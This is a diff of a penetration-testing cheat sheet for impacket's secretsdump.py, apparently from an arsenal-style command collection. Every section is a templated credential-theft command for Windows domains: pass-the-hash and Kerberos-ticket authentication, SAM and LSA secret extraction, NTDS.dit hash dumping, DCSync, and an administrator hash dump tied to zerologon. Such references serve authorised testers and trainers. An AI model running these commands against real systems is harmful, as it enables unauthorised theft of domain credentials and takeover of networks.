@@ -2,29 +2,60 @@
 
 % impacket-secrets, windows, smb, 445
 
-## dump with account
+## auth - account
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py '<domain>/<user>:<password>'@<ip>
+secretsdump.py '<domain_FQDN>/<user>:<password>'@<target_name>
 ```
 
-## dump with kerberos
+## auth - hash
 #plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump -k -k -no-pass -dc-ip <dc_ip> -no-pass -k <target_name>
+secretsdump.py -hashes <lm_hash>:<nt_hash> '<domain_FQDN>/<user>@<target_name>'
 ```
 
-## extract hash from sam dump files
-#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
+## auth - kerberos
+#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py  -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL
+KRB5CCNAME=<ccache> secretsdump.py -k -no-pass -dc-ip <dc_ip> -no-pass -k <target_name>
 ```
 
-## extract hash from ntds.dit
+## SAM - online
+#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
+
+## SAM - offline
 #plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:nthash> LOCAL -outputfile <ntlm-extract-file>
+secretsdump.py  -system <SYSTEM_FILE|system.save> -sam <SAM_FILE|sam.save> LOCAL
 ```
+
+## LSA - online
+#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
+
+## LSA - offline
+#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
+```
+secretsdump.py -system <SYSTEM_FILE|system.save> -security <SECURITY_FILE|security.save>' LOCAL
+```
+
+## NTDS - online (NTLM + keys)
+#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
+```
+secretsdump.py -just-dc -user-status -outputfile <ntlm-extract-file> '<domain>/<user>:<password>'@<dc_name>
+```
+
+## NTDS - online (only NTLM)
+#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
+```
+secretsdump.py -just-dc-ntlm -user-status -outputfile <ntlm-extract-file> '<domain>/<user>:<password>'@<dc_name>
+```
+
+## NTDS - offline
+#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
+```
+secretsdump.py  -ntds <NTDS_FILE|ntds_file.dit> -system <SYSTEM_FILE|system.save> LOCAL -outputfile <ntlm-extract-file>
+```
+
 
 ## anonymous get administrator 
 zerologon
@@ -33,19 +64,7 @@ zerologon
 secretsdump.py <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
 ```
 
-## remote extract
-#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> '<domain>/<user>:<password>'@<ip>
-```
-
-## remote extract + users infos
-#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> '<domain>/<user>:<password>'@<ip>
-```
-
-## remote dcsync (ptt)
+## DCSYNC - online (ptt)
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
 secretsdump.py -k -no-pass -just-dc -outputfile <file-prefix>  -dc-ip <dc_ip> '<domain>/<user>'@<dc_name>
